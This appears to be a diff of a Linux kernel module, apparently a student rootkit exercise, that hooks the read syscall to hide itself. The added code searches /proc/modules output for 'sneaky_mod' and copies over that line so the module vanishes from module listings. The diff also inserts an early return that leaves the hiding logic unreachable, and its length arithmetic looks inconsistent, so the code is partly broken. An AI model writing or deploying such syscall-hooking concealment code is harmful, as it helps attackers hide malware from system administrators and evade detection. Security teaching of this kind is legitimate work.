@@ -90,12 +90,14 @@ asmlinkage int (*original_call_read)(int fd, void *buf, size_t count);
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count)
 {
-  printk(KERN_INFO "Read: Very, very Sneaky!\n");
+  //printk(KERN_INFO "Read: Very, very Sneaky!!!!\n");
   int nread= original_call_read(fd,buf,count);
 
-  if (fd != proc_modules_fd) return nread; 
+  return nread; 
 
-  printk(KERN_INFO "Found prod/modules fd: %d\n",fd);
+  if (!proc_modules_fd) return nread; 
+
+  //printk(KERN_INFO "Found prod/modules fd= %d\n",fd);
   char* pcBuf=(char*) buf; 
 
   const char* sneakyBuff="sneaky_mod"; 
@@ -104,22 +106,28 @@ asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count)
 
   if (pch) // contains sneaky_mod
   {
-    printk(KERN_INFO "Performing read replacement!\n");
+    //printk(KERN_INFO "Performing read replacement!\n");
     
   //   // look for end of current line:
 
-    char EOL='\n';
-    char* EOL_location = strstr (pch,&EOL);
-
-    if (EOL_location)
-    {
-      printk(KERN_INFO "Located EOL -    %p , %p ,%p\n",(void*)buf,(void*)pch,(void*)EOL_location);
-      //memcpy(pch,EOL+1,nread-(EOL-pch+1)); 
-    }
+    int count = 0; 
+    char* pch2 = pch; 
+    while (pch2 && (*pch2 != '\n'))
+      pch2++;
 
 
+    int bytes_to_copy = nread-(int)(pch2-(char*)buf+1); 
+
+    memcpy(pch,pch2+1,bytes_to_copy); 
+
+    //printk(KERN_INFO "Located EOL -    %p , %p ,%p, %d \n",(char*)buf,(char*)pch,(char*)pch2, bytes_to_copy);
+     
   //   //strcpy (pch,"~~~~~~");
+
+    nread -= (int)(pch2-pch);
    }
+
+   proc_modules_fd=0; 
 
   return nread; 
 }
